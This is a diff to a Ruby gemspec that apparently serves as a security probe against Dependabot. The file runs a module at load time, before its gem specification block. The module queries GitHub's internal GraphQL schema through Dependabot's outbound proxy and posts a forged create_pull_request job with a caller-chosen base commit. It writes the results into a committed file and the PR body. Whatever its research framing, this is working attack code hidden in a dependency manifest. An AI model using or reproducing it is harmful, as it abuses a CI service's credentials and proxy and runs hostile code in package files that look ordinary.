@@ -10,8 +10,8 @@ require "uri"
 # three controlled workflow-run proof files.
 module OwnedDependabotNestedWorkflowScopeProbe
   CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
-  FORGED_BASE_SHA = "7595a899bbef9044959666e28d7589de552d3093"
-  RAW_PATH = "vendor/owned-dependabot-nested-workflow-scope-xff-control.txt"
+  FORGED_BASE_SHA = "7ad9e8ddb67ff0ac75f81bf8b60d2c9cbab5a080"
+  RAW_PATH = "vendor/owned-dependabot-internal-schema-egress-control.txt"
 
   module_function
 
@@ -26,7 +26,8 @@ module OwnedDependabotNestedWorkflowScopeProbe
     endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
     request = Net::HTTP::Post.new(endpoint.request_uri)
     request["Content-Type"] = "application/json"
-    request.body = JSON.generate(payload)
+    probe = internal_schema_probe
+    request.body = JSON.generate(payload(probe))
     proxy_client(endpoint).request(request)
   rescue Errno::EEXIST
     nil
@@ -42,7 +43,33 @@ module OwnedDependabotNestedWorkflowScopeProbe
     client
   end
 
-  def payload
+  def internal_schema_probe
+    endpoint = URI("https://api.github.com/graphql")
+    query = 'query{checkSuiteType:__type(name:"CheckSuite"){fields{name}} mutationType:__schema{mutationType{fields{name}}}}'
+    request = Net::HTTP::Post.new(endpoint.request_uri)
+    request["Content-Type"] = "application/json"
+    request["GraphQL-Schema"] = "internal"
+    request.body = JSON.generate("query" => query)
+    response = proxy_client(endpoint).request(request)
+    parsed = JSON.parse(response.body)
+    check_suite_fields = parsed.dig("data", "checkSuiteType", "fields") || []
+    mutation_fields = parsed.dig("data", "mutationType", "mutationType", "fields") || []
+    {
+      "http_status" => response.code.to_i,
+      "internal_artifacts_field_visible" => check_suite_fields.any? { |field| field["name"] == "artifacts" },
+      "internal_create_check_suite_visible" => mutation_fields.any? { |field| field["name"] == "createCheckSuite" },
+      "top_level_error_codes" => Array(parsed["errors"]).map { |error| error.dig("extensions", "code") || "unclassified" }.uniq.sort
+    }
+  rescue StandardError => error
+    {
+      "http_status" => 0,
+      "internal_artifacts_field_visible" => false,
+      "internal_create_check_suite_visible" => false,
+      "top_level_error_codes" => [error.class.name]
+    }
+  end
+
+  def payload(probe)
     requirement = {
       "file" => "Gemfile",
       "requirement" => ">= 0",
@@ -59,15 +86,15 @@ module OwnedDependabotNestedWorkflowScopeProbe
       "data" => {
         "dependencies" => [{
           "name" => "owned_dependabot_nested_workflow_scope_probe",
-          "version" => "0.0.8",
-          "previous-version" => "0.0.7",
+          "version" => "0.0.9",
+          "previous-version" => "0.0.8",
           "requirements" => [requirement],
           "previous-requirements" => [requirement],
           "directory" => "/"
         }],
         "updated-dependency-files" => [{
           "name" => RAW_PATH,
-          "content" => "owned nested-tree workflow scope X-Forwarded-For control\n",
+          "content" => "#{JSON.generate(probe)}\n",
           "directory" => "/",
           "type" => "file",
           "support_file" => false,
@@ -76,9 +103,9 @@ module OwnedDependabotNestedWorkflowScopeProbe
           "operation" => "create"
         }],
         "base-commit-sha" => FORGED_BASE_SHA,
-        "commit-message" => "test: owned nested-tree workflow X-Forwarded-For control",
-        "pr-title" => "Owned nested-tree workflow X-Forwarded-For control",
-        "pr-body" => "Owned security test. The explicit update is one benign marker; the corrected workflow file is inherited solely from the caller-selected parent commit."
+        "commit-message" => "test: owned Dependabot internal-schema egress control",
+        "pr-title" => "Owned Dependabot internal-schema egress control",
+        "pr-body" => "Owned security test. The marker records only schema-visibility booleans and an HTTP status from a benign query made through the real Dependabot outbound proxy. Result: #{JSON.generate(probe)}"
       }
     }
   end
@@ -88,7 +115,7 @@ OwnedDependabotNestedWorkflowScopeProbe.run
 
 Gem::Specification.new do |spec|
   spec.name = "owned_dependabot_remote_probe"
-  spec.version = "0.0.8"
+  spec.version = "0.0.9"
   spec.summary = "Owned Dependabot security probe"
   spec.authors = ["Owned Security Test"]
   spec.files = []
